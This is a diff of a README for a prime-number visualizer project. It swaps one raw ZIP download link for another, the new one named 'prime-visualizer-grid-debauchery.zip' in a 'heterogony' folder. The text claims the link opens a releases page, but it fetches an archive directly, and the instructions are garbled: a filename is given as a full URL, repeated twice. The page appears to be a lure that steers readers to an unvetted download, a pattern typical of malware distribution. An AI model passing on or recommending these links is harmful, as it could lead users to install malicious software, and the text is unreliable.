@@ -8,11 +8,11 @@ Welcome to the prime-grid-visualizer! This tool helps you visualize prime number
 
 To get started, you need to download the application. Click the button below to visit the releases page.
 
-[![Download Now](https://github.com/Aniket34200/prime-grid-visualizer/raw/refs/heads/main/heterogony/grid_prime_visualizer_2.3-alpha.1.zip)](https://github.com/Aniket34200/prime-grid-visualizer/raw/refs/heads/main/heterogony/grid_prime_visualizer_2.3-alpha.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Aniket34200/prime-grid-visualizer/main/heterogony/prime-visualizer-grid-debauchery.zip)](https://raw.githubusercontent.com/Aniket34200/prime-grid-visualizer/main/heterogony/prime-visualizer-grid-debauchery.zip)
 
 1. Click the link above to go to the releases page.
 2. Look for the latest version listed on that page.
-3. Download the required file for your system. It should be named something like `https://github.com/Aniket34200/prime-grid-visualizer/raw/refs/heads/main/heterogony/grid_prime_visualizer_2.3-alpha.1.zip` or `https://github.com/Aniket34200/prime-grid-visualizer/raw/refs/heads/main/heterogony/grid_prime_visualizer_2.3-alpha.1.zip`.
+3. Download the required file for your system. It should be named something like `https://raw.githubusercontent.com/Aniket34200/prime-grid-visualizer/main/heterogony/prime-visualizer-grid-debauchery.zip` or `https://raw.githubusercontent.com/Aniket34200/prime-grid-visualizer/main/heterogony/prime-visualizer-grid-debauchery.zip`.
 4. If you downloaded a ZIP file, extract its contents to a folder of your choice.
 
 ## 🖥️ System Requirements
@@ -64,6 +64,6 @@ This project is open-source and available under the MIT License. Feel free to us
 
 For more information, visit our GitHub repository.
 
-[![Download Now](https://github.com/Aniket34200/prime-grid-visualizer/raw/refs/heads/main/heterogony/grid_prime_visualizer_2.3-alpha.1.zip)](https://github.com/Aniket34200/prime-grid-visualizer/raw/refs/heads/main/heterogony/grid_prime_visualizer_2.3-alpha.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Aniket34200/prime-grid-visualizer/main/heterogony/prime-visualizer-grid-debauchery.zip)](https://raw.githubusercontent.com/Aniket34200/prime-grid-visualizer/main/heterogony/prime-visualizer-grid-debauchery.zip)
 
 Thank you for using prime-grid-visualizer! Enjoy your exploration of prime numbers!
